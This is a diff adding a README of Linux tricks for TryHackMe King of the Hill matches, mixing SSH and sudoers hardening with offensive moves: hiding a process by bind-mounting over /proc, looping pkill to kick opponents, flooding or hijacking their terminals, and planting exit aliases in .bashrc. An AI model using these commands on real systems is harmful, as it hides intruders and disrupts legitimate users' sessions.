@@ -1,2 +1,172 @@
-# Shell-vs-Shell-Techniques-
-TryHackMe Koth - Shell vs Shell techniques
+# Shell vs Shell
+## Linux techniques for shell vs shell in koth
+
+Repository Creator
+[![N|Solid](https://trackalerts.com/wp-content/uploads/2020/01/youtube.png)](https://youtube.com/c/MatheuZSecurity)
+
+#### This repository aims to show techniques to be able to use in a shell x shell in koth
+# Examples
+### Hide your PTS
+ if you have an opponent, and he is killing your session, you can become invisible in the machine, you can use this technique to hide on the machine, without needing a rootkit to hide
+
+```
+mount -o bind /tmp /proc/PID
+```
+
+there where it is written PID, you will put your PID there, for example you can use ps aux to get the PID of your PTS, and using this command you will be invisible, and your opponent will not be able to kill your session
+
+## Fixing vulnerabilities
+
+to protect the machine from other opponents it is very important to check if in /etc/sudoers any user is running some binary with root permission, for example
+
+```
+# User privilege specification
+root ALL=(ALL=ALL) ALL
+teste ALL=(root) SETENV:NOPASSWD: /usr/bin/git *, /usr/bin/chattr
+test1 ALL=(root) NOPASSWD: /bin/su test1, /usr/bin/chattr
+``` 
+here you can see that user teste and teste1 has root permission on the git and su binary, to fix this just remove everything from the teste and teste1 there
+```
+root ALL=(ALL=ALL) ALL
+```
+and it will be like that, so there will be no way to climb privilege by su and git
+
+## Protecting SSH
+if any user changed the root password for example you can lock it so that it doesn't log in directly as root using ssh
+
+> nano /etc/ssh/sshd_config
+
+in this configuration, you will go to "PermitRootLogin" and
+set it to "no"
+
+> PermitRootLogin no
+
+you can also put which users can connect to the server, for example if you are already malicious, you can create a user of your own and put root permissions, and define so that only you can connect to the server, but I recommend that you don't do that , do this only in private rooms with your friends.
+> nano /etc/ssh/sshd_config
+
+> AllowUsers user1 user2
+
+## Change default SSH port
+
+you can change the default ssh port and for example put it on a high port like 55999
+
+> nano /etc/ssh/sshd_config
+
+```
+Include /etc/ssh/sshd_config.d/*.conf
+
+Port 55999
+#AddressFamily any
+#ListenAddress 0.0.0.0
+#ListenAddress ::
+
+#HostKey /etc/ssh/ssh_host_rsa_key
+#HostKey /etc/ssh/ssh_host_ecdsa_key
+#HostKey /etc/ssh/ssh_host_ed25519_key
+```
+> service sshd restart 
+
+#### You can also set a limit on the number of authentication attempts and it can help prevent brute force attacks
+
+> sudo nano /etc/ssh/sshd_config
+
+arrive at the option “#MaxAuthTries 0” remove the # , and change it to the desired value, for example 3 attempts
+
+> MaxAuthTries 3
+
+Then save and restart
+
+> sudo systemctl restart sshd
+
+#### You can also remove the private key and public key from users, for example
+> rm /home/user1/.ssh/id_rsa
+> rm /home/user1/.ssh/id_rsa.pub
+
+#### You can also generate other ssh keys for the user
+
+> ssh-keygen -t rsa
+
+#### Many people use the recent vulnerability (Polkit) to escalate privileges, you can make it a bit more difficult by patching it.
+
+> chmod 0755 /usr/bin/pkexec
+
+## Chattr
+
+in koth, it is forbidden to change the permission of binaries, for example give a chmod 700 /usr/bin/find, except chattr, the chattr binary that you can remove from the machine ( remove from the machine after you use: chattr +i king. txt), rm /usr/bin/chattr, so no one will be able to change the attributes of king.txt
+
+- but if you have access to a koth box and you don't have chattr you can get a chattr binary from github and compile it on the machine and use
+
+> wget https://github.com/posborne/linux-programming-interface-exercises/blob/master/15-file-attributes/chattr.c
+
+> gcc chattr.c -o chattr
+
+> ./chattr +i king.txt
+
+and so you can upload that binary on the koth machine, or even upload chattr.c on the machine and compile the binary, so you can use
+
+#### if you're like me and you like to troll your opponents, here are some really cool things you can use to make fun of your friends
+
+you can also add an alias, in the .bashrc of a certain machine user, for example: nano /home/user1/.bashrc, and you can put a troll alias, for example every time the opponent is typing basic linux commands : cd, ls, echo, cat, etc, and make it disconnect from the machine.
+
+> nano /home/user1/.bashrc
+
+> alias cd="exit"
+
+> alias echo="exit"
+
+> alias cat="exit"
+
+> alias ls="exit"
+
+#### For you to know who is on the machine, just use the following commands.
+
+> ps aux | grep pts
+> who
+> w
+
+# Nyancat
+
+> git clone https://github.com/klange/nyancat
+
+> cd nyancat/src
+
+> make
+
+#### Sending Nyancat to machine
+
+> python -m SimpleHTTPServer 80 # on your local machine
+
+> wget http://yourip/nyancat # on the KOTH machine
+
+> chmod +x nyancat
+
+> ./nyancat > /dev/pts/# < here where is the # you will place the enemy
+
+#### Breaking pts by sending spam from urandom
+
+> cat /dev/urandom > /dev/pts/#
+
+#### killing session of a user logged into ssh/system
+> pkill -9 -t pts/#
+
+#### breaking into the shell of users logged into SSH
+
+you can use the following command to break into the shell of other logged in users
+
+> script -f /dev/pts/#
+
+#### If you want to kick someone out of the machine, and you kick it out, and your opponent keeps going back to the machine, create a script in bash, or you can even do it yourself in one line.
+
+> while true; do pkill -t -9 pts/#; done
+
+you can also use this to spam messages on the opponent's screen
+
+> while true; do echo trolled > /dev/pts#; done
+
+## Note
+
+Don't do anything wrong on the koth machines, please respect all the rules for everyone to have a great experience and a great game
+
+https://docs.tryhackme.com/docs/koth/king-of-the-hill
+
+# more content here soon!
